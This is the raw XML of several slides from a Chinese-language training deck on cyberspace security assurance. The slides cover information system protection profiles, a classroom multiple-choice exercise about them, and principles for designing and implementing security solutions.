              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>安全保障要求</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="363538" indent="-363538"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>应用注解</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="363538" indent="-363538"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
              </a:rPr>
              <a:t>符合性声明</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="图片 6"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="1700337"/>
            <a:ext cx="2952328" cy="4389855"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="爆炸形 2 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6314728" y="764704"/>
            <a:ext cx="2829272" cy="2159620"/>
          </a:xfrm>
          <a:prstGeom prst="irregularSeal2">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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>规范化、结构化信息系统安全保障具体需求</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22621627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325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325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3250"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="10" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="3250"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="11" presetID="53" presetClass="entr" presetSubtype="16"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325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325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5" dur="3250"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="16" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="6500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="17" presetID="53" presetClass="entr" presetSubtype="16"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325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325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1" dur="3250"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="22" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="9750"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="23" presetID="53" presetClass="entr" presetSubtype="16"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325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325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7" dur="3250"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="28" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="13000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="29" presetID="53" presetClass="entr" presetSubtype="16"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3250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="32" dur="325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3" dur="3250"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="34" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="16250"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="35" presetID="53" presetClass="entr" presetSubtype="16"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3250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="38" dur="325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9" dur="3250"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="40" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="19500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="41" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="after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p:cTn id="43" dur="3250" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="44" dur="325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45" dur="3250"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3">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p:cTn id="50" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="51" dur="3000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="52" dur="3000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="7"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                  </p:childTnLst>
                                </p:cTn>
                              </p:par>
                            </p:childTnLst>
                          </p:cTn>
                        </p:par>
                        <p:par>
                          <p:cTn id="53" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="3000"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="54" presetID="53" presetClass="entr" presetSubtype="16" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="55" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="56" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="57" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="5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86867" y="4302797"/>
            <a:ext cx="6763052" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>D</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>、某种类型信息系统的与实现相关的一组系统级安全保障目的</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="标题 213"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="836712"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>课堂练习</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="1528906"/>
            <a:ext cx="6184706" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>信息系统保护轮廓（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ISPP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）定义了（         ）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="786867" y="2214026"/>
            <a:ext cx="7940328" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>、某种类型信息系统的与实现无关的一组系统级安全保障要求</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="矩形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="786867" y="2910283"/>
            <a:ext cx="6879678" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>、某种类型信息系统的与实现相关的一组系统级安全保障要求</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="矩形 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="786867" y="3606540"/>
            <a:ext cx="6997475" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>C</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>、某种类型信息系统的与实现无关的一组系统级安全保障目的</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29652156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p:cTn id="34" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_w</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_w"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="6"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_h</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:fltVal val="0"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_h"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:animEffect transition="in" filter="fade">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8" grpId="0"/>
      <p:bldP spid="9"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9606" y="908720"/>
            <a:ext cx="7154761" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>知识域：网络空间</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>安全保障工作方法</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="1844824"/>
            <a:ext cx="7056784" cy="2781672"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>知识子域：设计并实施网络空间安全方案</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>了解网络空间安全方案的作用和主要内容</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>了解制定网络空间安全方案的主要原则</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="140000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>了解网络空间安全方案实施的主要原则</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 8" descr="j02920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8" y="4169762"/>
            <a:ext cx="1584325" cy="150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39007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3">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>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611560" y="891321"/>
            <a:ext cx="7632848" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>网络空间安全保障解决方案制定的原则</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61443" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="3212976"/>
            <a:ext cx="8191500" cy="2448272"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
              </a:rPr>
              <a:t>贴合实际具有可实施性</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>可接受的成本</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>合理的进度</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>技术可实现性</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" kern="1200" dirty="0">
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" kern="1200" dirty="0">
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>组织管理和文化的可接受性</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1626907"/>
            <a:ext cx="8226464" cy="1409617"/>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solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>以风险评估和法规要求得出的安全需求为依据</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>考虑系统的业务功能和价值</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="24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400" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>考虑系统风险哪些是必须处置的，哪些是可接受的</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
              <a:latin typeface="+mn-lt"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
